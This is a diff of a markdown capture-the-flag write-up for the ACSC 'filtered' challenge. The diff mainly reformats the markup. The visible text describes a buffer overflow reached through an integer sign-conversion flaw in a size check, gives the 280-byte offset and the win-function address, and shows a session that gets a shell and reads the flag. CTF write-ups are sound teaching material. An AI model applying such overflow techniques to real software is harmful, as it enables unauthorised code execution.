@@ -6,13 +6,15 @@ description: Buffer overflow with a flawed length check
 
 ## Description
 
-Filter invalid sizes to make it secure!  
-  
+Filter invalid sizes to make it secure!\
+\
 Backup: `nc 167.99.78.201 9001`
 
 `nc filtered.chal.acsc.asia 9001`
 
-{% file src="../../.gitbook/assets/filtered.tar.gz\_9a6cb1b3eafce70ff549ba6b942f34a9.gz" caption="Challenge Files" %}
+{% file src="../../.gitbook/assets/filtered.tar.gz_9a6cb1b3eafce70ff549ba6b942f34a9.gz" %}
+Challenge Files
+{% endfile %}
 
 ## Solution
 
@@ -82,14 +84,14 @@ int main() {
 
 The output would be:
 
-```text
+```
 -2147483648
 2147483648
 ```
 
 From here, this is a regular buffer overflow challenge. The offset is 280, and we want to jump to the win function here:
 
-```text
+```
 0x004011d6    1 65           sym.win
 ```
 
@@ -113,7 +115,7 @@ conn.interactive()
 
 Get the flag:
 
-```text
+```
 └─# python3 filtered.py
 [+] Opening connection to 167.99.78.201 on port 9001: Done
 b'Size:'
@@ -133,4 +135,3 @@ $ cat flag-08d995360bfb36072f5b6aedcc801cd7.txt
 ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}
 $
 ```
-
